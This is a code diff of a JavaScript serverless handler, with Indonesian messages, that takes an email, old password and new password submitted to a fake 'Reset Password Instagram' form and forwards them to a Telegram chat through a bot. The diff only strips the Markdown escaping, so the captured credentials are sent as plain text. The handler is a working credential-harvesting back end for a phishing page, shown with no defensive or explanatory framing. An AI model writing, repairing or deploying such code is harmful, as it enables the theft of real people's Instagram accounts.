@@ -1,5 +1,3 @@
-import fetch from 'node-fetch';
- 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Metode tidak diizinkan' });
@@ -18,19 +16,14 @@ export default async function handler(req, res) {
     return res.status(500).json({ message: 'Konfigurasi tidak tersedia' });
   }
 
-  // Escape karakter MarkdownV2
-  const escapeMarkdown = (text) => {
-    return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
-  };
-
   const text = `
-🔐 *Reset Password Instagram*
+🔐 Reset Password Instagram
 ━━━━━━━━━━━━━━━━━━
-📧 *Email:* \`${escapeMarkdown(email)}\`
-🔑 *Password Lama:* \`${escapeMarkdown(oldPass)}\`
-🆕 *Password Baru:* \`${escapeMarkdown(newPass)}\`
+📧 Email: ${email}
+🔑 Password Lama: ${oldPass}
+🆕 Password Baru: ${newPass}
 ━━━━━━━━━━━━━━━━━━
-🕒 ${escapeMarkdown(new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }))}
+🕒 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
 `;
 
   try {
@@ -41,9 +34,8 @@ export default async function handler(req, res) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chatId,
-        text,
-        parse_mode: 'MarkdownV2'
-      })
+        text
+      }),
     });
 
     const responseText = await send.text();
